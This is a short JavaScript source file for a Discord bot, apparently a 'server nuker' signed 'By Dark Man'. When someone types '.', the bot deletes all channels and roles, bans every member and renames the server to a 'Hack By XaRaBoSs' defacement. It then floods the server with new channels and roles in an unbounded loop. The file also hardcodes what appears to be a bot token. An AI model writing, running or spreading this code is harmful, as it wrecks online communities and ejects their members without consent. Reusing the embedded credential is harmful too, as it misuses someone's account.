const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ""; 
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Hack By XaRaBoSs");
      setInterval(function() {
        message.guild.createChannel("By XaRaBoSs", "voice");
        message.guild.createChannel("By XaRaBoSs", "text");
        message.guild.createRole({ name: "By XaRaBoSs" });
      });
    }
  }
});

client.login("ODMxNTY4NjMwMzg2OTE3NDQ2.YHXIow.wr8TgOWnknBuZTGiYDR5U-Ok-Yg");
///////By Dark Man\\\\\\\
